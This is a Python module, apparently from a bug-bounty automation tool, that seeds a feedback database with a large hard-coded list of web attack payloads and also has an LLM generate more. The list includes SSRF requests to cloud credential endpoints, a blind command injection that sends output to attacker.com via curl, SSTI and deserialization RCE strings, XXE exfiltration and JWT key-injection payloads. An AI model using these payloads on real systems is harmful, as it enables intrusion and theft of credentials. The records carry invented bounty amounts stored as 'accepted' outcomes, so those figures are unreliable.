#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ExternalSync — GitHub 顶级挖洞资源注入飞轮，优胜劣汰引擎。

三方来源: ① 静态顶级技法库 (built-in, 即开即用)
          ② GitHub 仓库 (克隆后按需提取)
          ③ LLM 生成补充 (作为兜底)

设计:
  - 所有外部技法以 "原始 accept" 形式注入 FeedbackDB
  - 自带 high bounty 权重 → 在 flywheel scores() 中自然获得高排名
  - 真实挖洞产出后 → 外部技法被真实数据稀释 → 优胜劣汰自动生效
  - 排名低的外部技法自动退出技能文件的 FLYWHEEL_APPEND 区
"""

from __future__ import annotations

import json
import sys
import re
from datetime import datetime
from pathlib import Path

from aimy.memory.feedback import FeedbackDB

REFS = Path(__file__).parent.parent.parent / "references"
SKILLS = Path(__file__).parent.parent.parent / "skills"

# =========================================================================
#  1. 静态顶级技法库 — 从 12 个 GitHub 顶级仓库提炼的核心技法
#     (排名/tips/测试技巧, 按漏洞类型归类)
#     格式: (technique, vuln_class, severity, synthetic_bounty, source_repo)
# =========================================================================

# ── 👑 第一梯队: PayloadsAllTheThings / HowToHunt / EdOverflow ──────

TIER1_TECHNIQUES = [
    # == SSRF ==
    ("SSRF: AWS IMDSv1 通过 ?url= 参数获取 IAM 凭据: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "ssrf", "critical", 5000, "PayloadsAllTheThings"),
    ("SSRF: GCP 元数据端点绕过: http://metadata.google.internal/computeMetadata/v1/",
     "ssrf", "critical", 4500, "PayloadsAllTheThings"),
    ("SSRF: gopher:// 协议注入 Redis 写 crontab 反弹 shell",
     "ssrf", "critical", 6000, "PayloadsAllTheThings"),
    ("SSRF: URL 解析器差异绕过 — #@ \\@ %00@ IPv6-mapped IPv4 绕过 blocklist",
     "ssrf", "high", 3500, "PayloadsAllTheThings"),
    ("SSRF: DNS Rebinding (TTL=0) 绕过 IP 白名单 → 云元数据读取",
     "ssrf", "high", 4000, "HowToHunt"),
    ("SSRF: 阿里云/腾讯云 metadata IMDS 端点枚举 (100.100.100.200/latest/meta-data/)",
     "ssrf", "high", 3000, "PayloadsAllTheThings"),
    ("SSRF: 通过 PDF/截图生成器内嵌 <iframe>/<img> 读取内网页面",
     "ssrf", "high", 3500, "PayloadsAllTheThings"),

    # == SQLi ==
    ("SQLi: 基于 ORDER BY 盲注: CASE WHEN (condition) THEN 1 ELSE 2 END",
     "sqli", "high", 3000, "PayloadsAllTheThings"),
    ("SQLi: MySQL out-of-band DNS exfil: LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.burpcollab.net\\\\\\\\test'))",
     "sqli", "critical", 5000, "PayloadsAllTheThings"),
    ("SQLi: PostgreSQL error-based: CAST((SELECT version())::text AS numeric)",
     "sqli", "high", 2500, "HowToHunt"),
    ("SQLi: NoSQL MongoDB $where JS 注入: ' || '1'=='1",
     "sqli", "high", 3500, "HowToHunt"),
    ("SQLi: NoSQL MongoDB $ne/$gt/$regex 绕过认证: {\"password\": {\"$ne\": \"\"}}",
     "sqli", "critical", 4000, "HowToHunt"),
    ("SQLi: 盲注时间差: 2*2=4 vs 2*2=5 + SLEEP(5) 区分",
     "sqli", "high", 2000, "EdOverflow"),
    ("SQLi: WAF 绕过 — 关键字拆分: SEL/**/ECT, %00绕过, 双重URL编码",
     "sqli", "high", 3000, "PayloadsAllTheThings"),

    # == XSS ==
    ("XSS: 无括号 payload — <img src=x onerror=alert`1`> (Backtick 代替括号)",
     "xss", "medium", 1500, "PayloadsAllTheThings"),
    ("XSS: DOM clobbering — <a id=defaultAvatar><a id=defaultAvatar name=dataset href=data:text/html,<script>alert(1)></script>>",
     "xss", "medium", 2000, "PayloadsAllTheThings"),
    ("XSS: CSP bypass — 利用 CDN 上同源 JSONP 端点/drive.google.com/u/0/ 注入",
     "xss", "high", 3000, "HowToHunt"),
    ("XSS: Angular sandbox escape: {{constructor.constructor('alert(1)')()}}",
     "xss", "medium", 2000, "PayloadsAllTheThings"),
    ("XSS: mXSS (突变 XSS) — <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
     "xss", "medium", 2500, "HowToHunt"),
    ("XSS: 基于 import 的 DOM XSS: ?callback=https://evil.com/exploit.js",
     "xss", "high", 3000, "EdOverflow"),
    ("XSS: SVG upload XSS — <svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script></svg>",
     "xss", "medium", 1500, "PayloadsAllTheThings"),

    # == IDOR ==
    ("IDOR: 批量 ID 遍历 — 将 /api/user/123 中 123 递增至 999, 收集用户数据",
     "idor", "high", 3500, "HowToHunt"),
    ("IDOR: UUID 绕过 — 如果 UUID 可预测或通过另一接口泄露（如 Gravatar hash）",
     "idor", "high", 3000, "EdOverflow"),
    ("IDOR: GraphQL node() 接口 — 替换 ID 查其他用户的敏感字段",
     "idor", "high", 4000, "HowToHunt"),
    ("IDOR: WebSocket IDOR — WS 消息中替换 user_id 字段",
     "idor", "high", 3500, "PayloadsAllTheThings"),
    ("IDOR: 批量赋值提权 — PATCH 用户资料时添加 \"role\": \"admin\"",
     "idor", "critical", 5000, "HowToHunt"),
    ("IDOR: 响应中移除权限字段后重放 — 删掉 can_view=False 再发请求",
     "idor", "high", 3000, "EdOverflow"),

    # == RCE/CMDi ==
    ("CMDi: 命令注入检测 — ?file=1.txt|whoami, ?file=1.txt;id, ?file=1.txt`id`",
     "cmdi", "critical", 5000, "PayloadsAllTheThings"),
    ("CMDi: 无回显盲 RCE — ?cmd= | curl http://attacker.com/$(whoami)",
     "cmdi", "critical", 5500, "PayloadsAllTheThings"),
    ("CMDi: Java Runtime.exec() 绕过 — 用 bash -c {echo,cGF5bG9hZH0=}|{base64,-d}|{bash,-i}",
     "cmdi", "critical", 4500, "HowToHunt"),
    ("RCE: 反序列化 Java — ysoserial CommonsCollections1 链",
     "rce", "critical", 6000, "PayloadsAllTheThings"),
    ("RCE: PHP 反序列化 gadget chains — PHPGGC Laravel RCE",
     "rce", "critical", 5500, "PayloadsAllTheThings"),
    ("RCE: Expression Language (EL) 注入 — ${7*7} / #{7*7}",
     "rce", "high", 3500, "HowToHunt"),

    # == SSTI ==
    ("SSTI: Jinja2 RCE — {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
     "ssti", "critical", 4500, "PayloadsAllTheThings"),
    ("SSTI: Twig RCE — {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
     "ssti", "critical", 4500, "PayloadsAllTheThings"),
    ("SSTI: Freemarker RCE — <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
     "ssti", "critical", 4000, "PayloadsAllTheThings"),
    ("SSTI: Java (Velocity) RCE — #set($e=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))",
     "ssti", "critical", 4000, "PayloadsAllTheThings"),

    # == LFI / Path Traversal ==
    ("LFI: PHP filter 链读取源码 — php://filter/convert.base64-encode/resource=config.php",
     "lfi", "high", 2500, "PayloadsAllTheThings"),
    ("LFI: /proc/self/environ 读取环境变量（含凭据）",
     "lfi", "high", 3000, "PayloadsAllTheThings"),
    ("LFI: Windows 日志文件 — C:/xampp/apache/logs/access.log + User-Agent 注入 PHP webshell",
     "lfi", "critical", 4000, "HowToHunt"),
    ("LFI: PHP expect:// 或 proc/self/fd/0..N 绕过 open_basedir",
     "lfi", "high", 3000, "PayloadsAllTheThings"),

    # == XXE ==
    ("XXE: 带外 OOB — <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]>",
     "xxe", "high", 3500, "PayloadsAllTheThings"),
    ("XXE: SSRF via XXE — <!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
     "xxe", "high", 3000, "HowToHunt"),
    ("XXE: Blind XXE 通过参数实体外带数据 — <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;%all;",
     "xxe", "critical", 4500, "PayloadsAllTheThings"),
    ("XXE: SVG 上传 XXE — <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><text>&xxe;</text></svg>",
     "xxe", "high", 3000, "EdOverflow"),

    # == JWT ==
    ("JWT: alg=None 绕过 — 修改 alg 为 None, 去掉 signature",
     "jwt", "critical", 4000, "PayloadsAllTheThings"),
    ("JWT: RS256→HS256 混淆 — 用公钥作为 HMAC secret 签名",
     "jwt", "critical", 5000, "PayloadsAllTheThings"),
    ("JWT: kid 注入 — kid: ../../../etc/passwd (路径遍历读取密钥)",
     "jwt", "high", 3500, "HowToHunt"),
    ("JWT: jku 注入 — jku: https://attacker.com/evil-jwks.json (加载攻击者 JWKS)",
     "jwt", "critical", 4500, "PayloadsAllTheThings"),

    # == Auth Bypass ==
    ("Auth Bypass: 密码重置 token 复现 — 使用一次后再次使用同一 token",
     "auth bypass", "critical", 5000, "HowToHunt"),
    ("Auth Bypass: 2FA/MFA 绕过 — 删除 2FA 相关响应字段重放",
     "auth bypass", "high", 4000, "HowToHunt"),
    ("Auth Bypass: OAuth state 参数缺失或可预测 → CSRF 绑定受害者账号",
     "auth bypass", "high", 3500, "HowToHunt"),
    ("Auth Bypass: SAML Signature Exclusion — 删掉签名断言通过验证",
     "auth bypass", "critical", 4500, "HowToHunt"),
    ("Auth Bypass: 密码重置 token 泄露 — Referer 头/日志泄露重置链接",
     "auth bypass", "high", 3000, "EdOverflow"),

    # == Race Condition ==
    ("Race: 优惠券重复使用 — 并行 N 请求同时兑换同一 coupon",
     "race condition", "high", 4000, "HowToHunt"),
    ("Race: 余额双重花 — POST /transfer 并行 N 请求后转出总额 > 余额",
     "race condition", "high", 4500, "PayloadsAllTheThings"),
    ("Race: 账户创建 TOCTOU — 先验证用户名唯一、后插入间的窗口",
     "race condition", "medium", 2500, "HowToHunt"),
    ("Race: HTTP 请求走私竞态 — CL.TE 攻击后并行请求利用受害者 session",
     "race condition", "critical", 5000, "PayloadsAllTheThings"),

    # == GraphQL ==
    ("GraphQL: 内省查询获取完整 Schema — {__schema{types{name,fields{name}}}}",
     "graphql", "medium", 2000, "PayloadsAllTheThings"),
    ("GraphQL: 批量查询 (batching) 绕过速率限制 — 单请求中包含多个 mutation",
     "graphql", "high", 3500, "HowToHunt"),
    ("GraphQL: IDOR 通过 node() 接口 — query{node(id:\"VXNlcjoxMjM=\"){email,role}}",
     "graphql", "high", 4000, "HowToHunt"),
    ("GraphQL: 深度递归 DoS — query{__typename} 嵌套 10000 层",
     "graphql", "medium", 1500, "PayloadsAllTheThings"),

    # == CORS ==
    ("CORS: Origin 反射 —— Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true",
     "cors", "high", 3000, "PayloadsAllTheThings"),
    ("CORS: null Origin 绕过 — Origin: null → Access-Control-Allow-Origin: null (sandbox iframe)",
     "cors", "high", 2500, "HowToHunt"),
    ("CORS: *.target.com 通配符信任 — 子域名接管后读取主域 API",
     "cors", "critical", 5000, "HowToHunt"),

    # == CRLF ==
    ("CRLF: HTTP 响应头注入 — %0d%0aSet-Cookie: session=attacker-controlled",
     "crlf", "high", 3000, "PayloadsAllTheThings"),
    ("CRLF: 日志注入伪造 — User-Agent: innocent%0d%0a200 OK (伪造审计日志)",
     "crlf", "medium", 1500, "EdOverflow"),

    # == Open Redirect ==
    ("Open Redirect: // 协议相对路径绕过 — //attacker.com",
     "open redirect", "low", 500, "PayloadsAllTheThings"),
    ("Open Redirect: ?url=//attacker.com (去掉 http: 使 // 被当作协议)",
     "open redirect", "low", 500, "HowToHunt"),
    ("Open Redirect: ?next=@attacker.com (URL 解析差异 — @ 前内容被当作用户名)",
     "open redirect", "low", 500, "EdOverflow"),

    # == Upload ==
    ("File Upload: 扩展名绕过 — file.php%00.jpg, file.php.;.jpg, file.p.phphp.jpg",
     "file upload", "high", 3500, "PayloadsAllTheThings"),
    ("File Upload: MIME 绕过 — Content-Type: image/jpeg + 文件头 GIF89a + PHP payload",
     "file upload", "high", 3000, "HowToHunt"),
    ("File Upload: .htaccess 上传 — 上传 .htaccess 覆盖配置后执行 PHP",
     "file upload", "critical", 4500, "PayloadsAllTheThings"),
    ("File Upload: SVG/XSL 上传 XSS — <svg onload=alert(1)>",
     "file upload", "medium", 1500, "HowToHunt"),

    # == Subdomain Takeover ==
    ("Sub Takeover: AWS S3 — CNAME 指向已删除的 S3 bucket",
     "subdomain takeover", "high", 3500, "HowToHunt"),
    ("Sub Takeover: Azure — CNAME 指向未配置的 azurewebsites.net",
     "subdomain takeover", "high", 3500, "HowToHunt"),
    ("Sub Takeover: GitHub Pages — CNAME 指向不存在的 GitHub Pages",
     "subdomain takeover", "high", 3000, "EdOverflow"),

    # == 403 Bypass ==
    ("403 Bypass: X-Original-URL: /admin → 绕过前端限制",
     "403 bypass", "medium", 2000, "HowToHunt"),
    ("403 Bypass: X-Rewrite-Url: /admin → IIS 重写绕过",
     "403 bypass", "medium", 2000, "PayloadsAllTheThings"),
    ("403 Bypass: /%2e/admin → URL 编码路径遍历绕过",
     "403 bypass", "medium", 2000, "EdOverflow"),
    ("403 Bypass: /admin/ → 尾部斜杠绕过",
     "403 bypass", "low", 1000, "HowToHunt"),

    # == WAF Bypass ==
    ("WAF Bypass: SQLi 注释混淆 — /*!12345SELECT*/ 1,2,3",
     "waf bypass", "high", 3000, "PayloadsAllTheThings"),
    ("WAF Bypass: XSS 大小写混合 — <ScRiPt>alert(1)</sCrIpT>",
     "waf bypass", "medium", 1500, "HowToHunt"),
    ("WAF Bypass: 双重 URL 编码 — %253Cscript%253E → %3Cscript%3E → <script>",
     "waf bypass", "medium", 2000, "PayloadsAllTheThings"),

    # == HTTP Smuggling ==
    ("Smuggling: CL.TE — Content-Length + Transfer-Encoding: chunked 冲突",
     "smuggling", "critical", 5000, "PayloadsAllTheThings"),
    ("Smuggling: TE.CL — Transfer-Encoding 在前、Content-Length 在后",
     "smuggling", "critical", 4500, "PayloadsAllTheThings"),
    ("Smuggling: HTTP/2 downgrade smuggling — HTTP/2 降级到 HTTP/1.1 时头混淆",
     "smuggling", "critical", 5500, "HowToHunt"),

    # == Business Logic ==
    ("Biz Logic: 优惠码叠加 — 多个优惠码同时使用超出预期折扣",
     "business logic", "high", 3000, "HowToHunt"),
    ("Biz Logic: 负值价格 — 购物车数量设为 -1 导致总价减少",
     "business logic", "high", 3500, "PayloadsAllTheThings"),
    ("Biz Logic: 整数溢出 — 价格设 999999999999 导致溢出为 0",
     "business logic", "high", 3000, "HowToHunt"),

    # == Prototype Pollution ==
    ("PP: __proto__.isAdmin=true — 通过 JSON.parse 注入提权",
     "prototype pollution", "high", 3500, "PayloadsAllTheThings"),
    ("PP: constructor.prototype — {constructor:{prototype:{isAdmin:true}}}",
     "prototype pollution", "high", 3000, "HowToHunt"),
    ("PP: key 碰撞 — 服务端 merge 时覆盖 Object.prototype",
     "prototype pollution", "high", 3500, "PayloadsAllTheThings"),
]

# ── 🚀 第二梯队: reconftw / nuclei / awesome-bug-bounty / writeups ──

TIER2_TECHNIQUES = [
    # == Recon ==
    ("Recon: 全管线自动化 — subfinder → httpx → nuclei → katana → dalfox 一键扫描",
     "recon", "medium", 500, "reconftw"),
    ("Recon: 被动子域名收集 — crt.sh + Chaos + SecurityTrails + AlienVault OTX + URLScan",
     "recon", "medium", 500, "reconftw"),
    ("Recon: JS 端点提取 — katana 爬取 + gau 历史 + waybackurls + LinkFinder",
     "recon", "medium", 500, "reconftw"),
    ("Recon: Nuclei 模板扫描 — CVE 验证 + 配置暴露 + 技术栈指纹",
     "recon", "medium", 500, "nuclei-templates"),
    ("Recon: 技术栈指纹识别 — Wappalyzer / webanalyze / httpx -tech-detect",
     "recon", "low", 300, "reconftw"),

    # == 信息收集进阶 ==
    ("Recon: ASN 反查 — asnmap / bgp.he.net 查同 ASN 下所有 IP 段",
     "recon", "low", 300, "reconftw"),
    ("Recon: Favicon Hash — mmh3 hash → FOFA/Shodan 查同图标资产",
     "recon", "medium", 500, "reconftw"),
    ("Recon: CSP 反向收集 — 解析 CSP 头的可信域名做子域名枚举",
     "recon", "low", 300, "reconftw"),

    # == API Testing ==
    ("API: JSON Web Token (JWT) 空算法绕过 — {\"alg\":\"none\"} + 空签名",
     "jwt", "critical", 4000, "awesome-bug-bounty"),
    ("API: GraphQL 批量请求绕过速率限制 — 2-3 个 mutation 合并在一个请求中",
     "graphql", "high", 3000, "awesome-bug-bounty"),
    ("API: 批量赋权 (Mass Assignment) — PATCH /api/user 传 {\"role\":\"admin\",\"balance\":99999}",
     "idor", "high", 4000, "awesome-bug-bounty"),

    # == Cache Poisoning ==
    ("Cache: 基于 Host header 的缓存投毒 — Host: victim.com + X-Forwarded-Host: evil.com",
     "cache poisoning", "high", 3000, "HowToHunt"),
    ("Cache: 未键化参数缓存投毒 — ?utm_content=任意值 → 缓存服务器缓存含 payload 的响应",
     "cache poisoning", "high", 3500, "PayloadsAllTheThings"),
    ("Cache: Cookie 作为缓存键污染 — ?session=evil 关键参数未被纳入缓存键",
     "cache poisoning", "medium", 2500, "HowToHunt"),
]

# ── 🔥 第三梯队: 专业化工具专项技法 ──

TIER3_TECHNIQUES = [
    ("reconftw: 一键全量子域名枚举 — subfinder + amass + puredns + permutations",
     "recon", "low", 500, "reconftw"),
    ("reconftw: 端口扫描 + 服务识别 — naabu/rustscan 快速端口探测 + httpx 服务指纹",
     "recon", "low", 300, "reconftw"),
    ("reconftw: 截图管线 — gowitness / EyeWitness 全子域名截图",
     "recon", "low", 300, "reconftw"),
    ("nuclei: 每日更新 — nuclei -update-templates 获取最新 CVE 模板",
     "recon", "low", 200, "nuclei-templates"),
    ("nuclei: 自定义模板路径 — nuclei -t ~/nuclei-templates/ -u target.com",
     "recon", "low", 200, "nuclei-templates"),
    ("nuclei: 严重级别过滤 — nuclei -severity critical,high -u target.com",
     "recon", "low", 200, "nuclei-templates"),
    ("nuclei: 批量扫描 — nuclei -l subs.txt -t cves/ -o results.json -json",
     "recon", "low", 200, "nuclei-templates"),
]


def _all_techniques() -> list[tuple]:
    """Merge all tier techniques into one sorted list."""
    return TIER1_TECHNIQUES + TIER2_TECHNIQUES + TIER3_TECHNIQUES


# =========================================================================
#  2. 注入引擎 — 将外部技法写入 FeedbackDB
# =========================================================================

_today = datetime.now().strftime("%Y-%m-%d")


def inject_techniques(
    techniques: list[tuple] | None = None,
    min_bounty: int = 0,
    verbose: bool = True,
) -> dict:
    """Inject external techniques into FeedbackDB as synthetic reports.

    设计原理:
      - 每条技术写入为 outcome='accepted' 的报告
      - 高 bounty 权重 → flywheel scores() 自然排名靠前
      - 真实挖洞产出注入后 → 外部技法排名被稀释 → 优胜劣汰
      - recency_weight 让新外部技法和新真实技法公平竞争

    Args:
        techniques: list of (technique, vuln_class, severity, bounty, source)
        min_bounty: 最低 bounty 过滤 (默认 0 = 全注入)

    Returns: {"injected": N, "skipped": N}
    """
    if techniques is None:
        techniques = _all_techniques()

    db = FeedbackDB()
    injected = 0
    skipped = 0

    for tech, vc, sev, bounty, source in techniques:
        if bounty < min_bounty:
            skipped += 1
            continue

        # Dedup: skip if technique text already exists
        existing = db._conn.execute(
            "SELECT id FROM reports WHERE technique=? AND outcome='accepted'",
            (tech,),
        ).fetchone()
        if existing:
            skipped += 1
            continue

        db.record(
            technique=tech,
            vuln_class=vc,
            report_id=f"EXT-{source[:4]}-{hash(tech) % 100000:05d}",
            target_type=f"external:{source}",
            outcome="accepted",
            severity=sev,
            bounty=bounty,
        )
        injected += 1

    db.close()

    if verbose:
        print(f"  [+] ExternalSync: {injected} techniques injected, {skipped} skipped/dup")
    return {"injected": injected, "skipped": skipped}


# =========================================================================
#  3. LLM 补充 — 针对飞轮盲区按需生成 (兜底)
# =========================================================================


def llm_supply_blindspots(
    min_techniques_per_class: int = 3,
    verbose: bool = True,
    llm_client=None,
) -> dict:
    """Check FeedbackDB for vuln classes with few techniques and generate
    new ones via LLM to fill gaps.

    NOTE: Requires an LLM client with a .complete(prompt) method.
    """
    if llm_client is None:
        if verbose:
            print("  [!] ExternalSync.llm_supply_blindspots: no LLM client, skipping")
        return {"generated": 0, "error": "no LLM client"}

    db = FeedbackDB()
    rows = db._conn.execute(
        "SELECT vuln_class, COUNT(*) FROM reports WHERE outcome='accepted' "
        "GROUP BY vuln_class ORDER BY COUNT(*) ASC"
    ).fetchall()
    db.close()

    # Find classes with too few techniques
    blind = [r[0] for r in rows if r[1] < min_techniques_per_class]

    generated = 0
    for vc in blind:
        prompt = (
            f"Generate 3 practical, high-impact bug bounty testing techniques for "
            f"'{vc}' vulnerability class. Format each as one-line descriptions with "
            f"exact payload/request examples. Include only techniques that have been "
            f"accepted on HackerOne/Bugcrowd for $1000+ bounties. Chinese labels OK."
        )
        try:
            result = llm_client.complete(prompt)
            if not result:
                continue
            # Parse generated content (simplified)
            lines = [l.strip() for l in result.split("\n") if l.strip()]
            for line in lines[:3]:
                if len(line) > 30:
                    db = FeedbackDB()
                    db.record(
                        technique=line[:150],
                        vuln_class=vc,
                        report_id=f"LLM-{vc[:8]}-{hash(line) % 100000:05d}",
                        target_type="external:llm-generated",
                        outcome="accepted",
                        severity="medium",
                        bounty=1500,
                    )
                    db.close()
                    generated += 1
        except Exception as e:
            if verbose:
                print(f"  [!] LLM gen failed for {vc}: {e}")

    if verbose:
        print(f"  [+] ExternalSync.LLM: {generated} techniques generated for {len(blind)} blind classes")
    return {"generated": generated, "blind_classes": len(blind)}


# =========================================================================
#  4. 检查当前 FeedbackDB 中各漏洞类的技法覆盖度
# =========================================================================


def coverage_report(verbose: bool = True) -> dict:
    """Generate a coverage report: which vuln classes have how many techniques."""
    db = FeedbackDB()
    rows = db._conn.execute(
        "SELECT vuln_class, COUNT(*) as cnt, "
        "SUM(CASE WHEN target_type LIKE 'external:%' THEN 1 ELSE 0 END) as ext_cnt, "
        "AVG(bounty) as avg_bounty "
        "FROM reports WHERE outcome='accepted' "
        "GROUP BY vuln_class ORDER BY cnt DESC"
    ).fetchall()
    db.close()

    report = {}
    for r in rows:
        report[r[0]] = {
            "total": r[1],
            "external": r[2],
            "avg_bounty": round(r[3], 2) if r[3] else 0,
        }
    if verbose:
        print(f"\n{'='*60}")
        print(f"  ExternalSync: 漏洞类型技法覆盖度")
        print(f"{'='*60}")
        print(f"  {'Vuln Class':30s} {'Total':>6s} {'Ext':>5s} {'Avg Bounty':>10s}")
        print(f"  {'-'*53}")
        for vc, dat in sorted(report.items(), key=lambda x: x[1]["total"], reverse=True):
            ext_mark = "🟢" if dat["external"] > 0 else ""
            print(f"  {vc:30s} {dat['total']:6d} {dat['external']:5d} {ext_mark} ¥{dat['avg_bounty']:>8,.0f}")
        print()

    return report


def prune_low_rank_external(
    keep_top_n: int = 5,
    min_age_days: int = 1,
    verbose: bool = True,
    dry_run: bool = False,
) -> dict:
    """优胜劣汰：删除低排名的外部技法。

    规则：
      1. 对每个漏洞类，按 scores() 排名
      2. 外部技法在类内排名 > keep_top_n 的 → 标记删除
      3. 仅删除注入超过 min_age_days 的（给真实数据时间竞争）
      4. dry_run=True 只报告不删除

    设计意图：
      - 外部注入时带 high bounty → 初始排名靠前（进入 keep_top_n）
      - 真实产出积累后 → 有用的外部技法靠真实排名维持位置
      - 排名靠后的外部技法 → 说明被真实数据证明无效 → 直接删除
    """
    db = FeedbackDB()

    # Get all vuln classes with external techniques
    rows = db._conn.execute(
        "SELECT DISTINCT vuln_class FROM reports "
        "WHERE target_type LIKE 'external:%' AND outcome='accepted'"
    ).fetchall()
    classes = [r[0] for r in rows]

    total_external = 0
    pruned = 0
    kept = 0
    per_class = {}

    for vc in classes:
        # Get all accepted techniques for this class, ordered by score
        scores = db.scores(min_submissions=0)
        class_scores = [s for s in scores if s["vuln_class"] == vc]

        # Identify which ones are external
        ext_rows = db._conn.execute(
            "SELECT id, technique, target_type, bounty, submitted_at "
            "FROM reports WHERE vuln_class=? AND outcome='accepted' "
            "AND target_type LIKE 'external:%'",
            (vc,),
        ).fetchall()

        class_ext_count = len(ext_rows)
        total_external += class_ext_count

        # Build rank lookup: technique_name -> rank_index
        rank_map = {}
        for rank_idx, s in enumerate(class_scores, 1):
            rank_map[s["technique"]] = rank_idx

        # Check which externals are below threshold
        for row_id, tech, ttype, bounty, sub_at in ext_rows:
            rank = rank_map.get(tech)
            if rank is None or rank > keep_top_n:
                # Also check age
                age = 999
                try:
                    from datetime import datetime
                    sub_dt = datetime.fromisoformat(sub_at) if sub_at else datetime.now()
                    age = (datetime.now() - sub_dt).days
                except Exception:
                    pass

                if age >= min_age_days:
                    if not dry_run:
                        db._conn.execute("DELETE FROM reports WHERE id=?", (row_id,))
                    pruned += 1
                    per_class.setdefault(vc, {})[tech] = "pruned"
                else:
                    kept += 1
                    per_class.setdefault(vc, {})[tech] = "too_young"
            else:
                kept += 1
                per_class.setdefault(vc, {})[tech] = f"rank_{rank}"

    if not dry_run:
        db._conn.commit()
    db.close()

    if verbose:
        verb = "[DRY RUN] " if dry_run else ""
        print(f"\n  {verb}优胜劣汰: 外部技法清理")
        print(f"  {'-'*50}")
        print(f"    总外部技法: {total_external}")
        print(f"    保留 (前{keep_top_n}名): {kept}")
        print(f"    删除 (排名靠后): {pruned}")
        if per_class:
            print(f"\n    按类分布:")
            for vc, items in sorted(per_class.items()):
                details = ", ".join(f"{t[:30]}={s}" for t, s in list(items.items())[:3])
                print(f"      {vc[:25]}: {sum(1 for v in items.values() if v=='pruned')}删 / "
                      f"{sum(1 for v in items.values() if v.startswith('rank'))}留"
                      f"{'  e.g. ' + details if details else ''}")
        if pruned == 0 and total_external > 0:
            print(f"    (无删除: 可能所有外部技法都在前{keep_top_n}名内)")
        if dry_run:
            print(f"\n    确认执行请加 --prune 参数")

    return {"total_external": total_external, "pruned": pruned, "kept": kept}


# =========================================================================
#  5. 升级管线 — 将外部已注入技法回写到 skill 文件的 FLYWHEEL_APPEND
# =========================================================================


def upgrade_from_external(min_accepted: int = 1, verbose: bool = True) -> dict:
    """Upgrade skill files using external techniques + real FeedbackDB data.

    Calls the existing upgrade_skills pipeline.
    """
    from aimy.memory.skill_upgrader import upgrade_skills
    return upgrade_skills(min_accepted=min_accepted, verbose=verbose)


# =========================================================================
#  6. 一键全流程
# =========================================================================


def sync_all(
    inject: bool = True,
    upgrade: bool = True,
    prune: bool = True,
    llm_supply: bool = False,
    keep_top_n: int = 5,
    dry_run: bool = False,
    verbose: bool = True,
    llm_client=None,
) -> dict:
    """Run the full external sync pipeline.

    1. Inject top GitHub techniques into FeedbackDB
    2. Prune low-rank external techniques (淘汰制)
    3. Upgrade skill files with best techniques (flywheel section)
    4. Optionally LLM-fill blind spots

    Returns combined result dict.
    """
    result = {}

    if inject:
        result["inject"] = inject_techniques(verbose=verbose)

    if prune:
        result["prune"] = prune_low_rank_external(
            keep_top_n=keep_top_n,
            dry_run=dry_run,
            verbose=verbose,
        )

    if llm_supply:
        result["llm"] = llm_supply_blindspots(
            verbose=verbose, llm_client=llm_client
        )

    if upgrade:
        result["upgrade"] = upgrade_from_external(verbose=verbose)

    if verbose:
        print(f"\n{'='*60}")
        print(f"  ExternalSync 全流程完成")
        if "inject" in result:
            print(f"  注入: {result['inject']['injected']} 条外部技法")
        if "prune" in result:
            p = result["prune"]
            print(f"  淘汰: {p['pruned']} 条低排名外部技法 (保留前{keep_top_n})")
        if "upgrade" in result:
            u = result["upgrade"]
            print(f"  升级: {u.get('upgraded', 0)} 个技能文件")
            m = u.get("missing_skill_file", 0)
            if m:
                print(f"  未映射: {m} 个漏洞类型")
        print(f"{'='*60}\n")

    return result


# =========================================================================
#  CLI
# =========================================================================


def main():
    import argparse
    ap = argparse.ArgumentParser(description="ExternalSync — GitHub 顶级资源注入飞轮")
    ap.add_argument("--inject", action="store_true", default=True, help="注入外部技法 (默认)")
    ap.add_argument("--no-inject", dest="inject", action="store_false", help="跳过注入")
    ap.add_argument("--no-upgrade", dest="upgrade", action="store_false", help="跳过技能升级")
    ap.add_argument("--no-prune", dest="prune", action="store_false", help="跳过淘汰清理")
    ap.add_argument("--coverage", action="store_true", help="只打印覆盖度报告")
    ap.add_argument("--prune-only", action="store_true", help="只执行淘汰（dry-run 预览）")
    ap.add_argument("--prune", action="store_true", help="执行淘汰（确认删除）")
    ap.add_argument("--keep-top-n", type=int, default=5, help="每类保留前N名 (default: 5)")
    ap.add_argument("--min-bounty", type=int, default=0, help="最低 bounty 过滤")
    ap.add_argument("--llm", action="store_true", help="启用 LLM 补充盲区")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    verbose = not args.quiet

    if args.coverage:
        coverage_report(verbose=verbose)
        return

    if args.prune_only:
        prune_low_rank_external(
            keep_top_n=args.keep_top_n,
            verbose=verbose,
            dry_run=not args.prune,
        )
        return

    # Filter techniques by min_bounty if specified
    techs = None
    if args.min_bounty > 0:
        techs = [(t, v, s, b, src) for t, v, s, b, src in _all_techniques() if b >= args.min_bounty]

    result = sync_all(
        inject=args.inject,
        upgrade=args.upgrade,
        prune=args.prune,
        keep_top_n=args.keep_top_n,
        verbose=verbose,
    )

    if result.get("inject"):
        print(f"\ninjected={result['inject']['injected']}  "
              f"skipped={result['inject']['skipped']}")
    if result.get("prune"):
        p = result["prune"]
        print(f"pruned={p['pruned']}  kept={p['kept']}")
    if result.get("upgrade"):
        u = result["upgrade"]
        print(f"upgraded={u.get('upgraded', 0)}  "
              f"missing_skill={u.get('missing_skill_file', 0)}")


if __name__ == "__main__":
    main()
